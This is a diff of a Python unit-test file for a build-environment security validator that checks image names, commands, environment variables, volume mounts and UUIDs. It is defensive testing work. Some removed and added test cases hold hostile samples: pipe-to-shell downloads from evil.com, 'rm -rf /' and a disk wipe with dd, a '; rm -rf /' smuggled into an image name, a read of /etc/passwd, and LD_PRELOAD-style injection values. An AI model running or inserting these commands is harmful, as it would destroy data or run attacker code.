@@ -2,136 +2,87 @@
 """Tests for the build-env security validation module."""
 
 import unittest
-from unittest.mock import Mock, patch
-
 import sys
 import os
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from security import SecurityValidation
+
+from security import (
+    validate_image_name,
+    filter_environment_variables,
+    validate_uuid,
+    generate_container_uuid,
+    SecurityError
+)
 
 
 class TestSecurityValidation(unittest.TestCase):
     """Test cases for security validation functionality."""
 
-    def test_validate_image_name_valid(self):
-        """Test that valid image names pass validation."""
-        validator = SecurityValidation()
-
-        # Valid image names
+    def test_validate_image_name_success(self):
+        """Test valid image names pass validation."""
         valid_images = [
             "ubuntu:20.04",
-            "python:3.9",
-            "node:16-alpine",
+            "python:3.11",
+            "node:18-alpine",
             "golang:1.19",
             "alpine:latest"
         ]
 
         for image in valid_images:
             with self.subTest(image=image):
-                self.assertTrue(validator.validate_image_name(image))
+                self.assertTrue(validate_image_name(image))
 
-    def test_validate_image_name_invalid(self):
-        """Test that invalid image names fail validation."""
-        validator = SecurityValidation()
-
-        # Invalid image names
+    def test_validate_image_name_failure(self):
+        """Test invalid image names raise appropriate errors."""
         invalid_images = [
-            "../../malicious",  # Path traversal
-            "http://evil.com/image",  # URL
-            "file:///etc/passwd",  # File URL
-            "image with spaces",  # Spaces
-            "image\twith\ttabs",  # Tabs
-            "image\nwith\nnewlines",  # Newlines
-            ""  # Empty string
+            "../malicious",
+            "; rm -rf /",
+            "image with spaces",
+            ""
         ]
 
         for image in invalid_images:
             with self.subTest(image=image):
-                self.assertFalse(validator.validate_image_name(image))
+                with self.assertRaises(SecurityError):
+                    validate_image_name(image)
 
-    def test_validate_command_safe(self):
-        """Test that safe commands pass validation."""
-        validator = SecurityValidation()
-
-        safe_commands = [
-            ["ls", "-la"],
-            ["npm", "install"],
-            ["python", "setup.py", "install"],
-            ["go", "build", "./..."],
-            ["make", "test"]
-        ]
-
-        for cmd in safe_commands:
-            with self.subTest(cmd=cmd):
-                self.assertTrue(validator.validate_command(cmd))
-
-    def test_validate_command_dangerous(self):
-        """Test that dangerous commands fail validation."""
-        validator = SecurityValidation()
-
-        dangerous_commands = [
-            ["rm", "-rf", "/"],  # Dangerous rm
-            ["dd", "if=/dev/zero", "of=/dev/sda"],  # Disk destruction
-            ["chmod", "777", "/etc"],  # Permission escalation
-            ["wget", "http://evil.com/script.sh", "-O-", "|", "sh"],  # Pipe to shell
-            ["curl", "http://evil.com/script.sh", "|", "bash"]  # Pipe to bash
-        ]
-
-        for cmd in dangerous_commands:
-            with self.subTest(cmd=cmd):
-                self.assertFalse(validator.validate_command(cmd))
-
-    def test_validate_environment_variables_safe(self):
-        """Test that safe environment variables pass validation."""
-        validator = SecurityValidation()
-
-        safe_env = {
-            "PATH": "/usr/local/bin:/usr/bin:/bin",
+    def test_filter_environment_variables(self):
+        """Test environment variable filtering."""
+        env_vars = {
+            "PATH": "/usr/bin",
             "HOME": "/home/user",
-            "LANG": "en_US.UTF-8",
-            "NODE_ENV": "production"
+            "DOCKER_HOST": "unix:///var/run/docker.sock",
+            "AWS_ACCESS_KEY_ID": "secret",
+            "BUILD_CONTAINER": "python:3.11",
+            "_SECRET": "hidden"
         }
 
-        self.assertTrue(validator.validate_environment_variables(safe_env))
+        filtered = filter_environment_variables(env_vars)
 
-    def test_validate_environment_variables_dangerous(self):
-        """Test that dangerous environment variables fail validation."""
-        validator = SecurityValidation()
+        self.assertIn("PATH", filtered)
+        self.assertIn("HOME", filtered)
+        self.assertIn("BUILD_CONTAINER", filtered)
+        self.assertNotIn("DOCKER_HOST", filtered)
+        self.assertNotIn("AWS_ACCESS_KEY_ID", filtered)
+        self.assertNotIn("_SECRET", filtered)
 
-        dangerous_env = {
-            "PATH": "/evil/bin:/usr/bin",  # Modified PATH
-            "LD_PRELOAD": "/evil/lib.so",  # Library injection
-            "PYTHONSTARTUP": "/evil/script.py",  # Python injection
-            "NODE_OPTIONS": "--require /evil/module.js"  # Node injection
-        }
+    def test_validate_uuid(self):
+        """Test UUID validation."""
+        valid_uuid = "550e8400-e29b-41d4-a716-446655440000"
+        invalid_uuid = "not-a-uuid"
 
-        self.assertFalse(validator.validate_environment_variables(dangerous_env))
+        self.assertTrue(validate_uuid(valid_uuid))
+        with self.assertRaises(SecurityError):
+            validate_uuid(invalid_uuid)
 
-    def test_validate_volumes_safe(self):
-        """Test that safe volume mounts pass validation."""
-        validator = SecurityValidation()
+    def test_generate_container_uuid(self):
+        """Test UUID generation."""
+        uuid1 = generate_container_uuid()
+        uuid2 = generate_container_uuid()
 
-        safe_volumes = {
-            "/app": "/host/app",
-            "/data": "/host/data",
-            "/tmp": "/host/tmp"
-        }
-
-        self.assertTrue(validator.validate_volumes(safe_volumes))
-
-    def test_validate_volumes_dangerous(self):
-        """Test that dangerous volume mounts fail validation."""
-        validator = SecurityValidation()
-
-        dangerous_volumes = {
-            "/etc": "/host/etc",  # System configuration
-            "/root": "/host/root",  # Root home
-            "/proc": "/host/proc",  # Process filesystem
-            "/sys": "/host/sys",  # System filesystem
-            "/dev": "/host/dev"  # Device files
-        }
-
-        self.assertFalse(validator.validate_volumes(dangerous_volumes))
+        self.assertNotEqual(uuid1, uuid2)
+        self.assertTrue(validate_uuid(uuid1))
+        self.assertTrue(validate_uuid(uuid2))
 
 
 if __name__ == "__main__":
